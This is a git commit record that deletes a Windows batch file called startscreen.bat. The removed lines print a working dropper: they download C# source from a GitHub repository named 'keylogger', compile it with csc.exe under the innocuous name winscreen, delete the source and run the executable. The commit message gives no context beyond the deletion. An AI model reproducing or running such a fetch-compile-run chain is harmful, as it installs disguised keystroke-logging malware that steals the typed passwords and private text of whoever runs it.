46ba9d47e67b2ae02d063e19f0e44f1036d533c0
AnonUser <127699732+w3irdguy@users.noreply.github.com>
2024-09-08 08:15:41 -0300

    Delete startscreen.bat

--- startscreen.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/winscreen.cs
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe winscreen.cs
-erase winscreen.cs & winscreen.exe
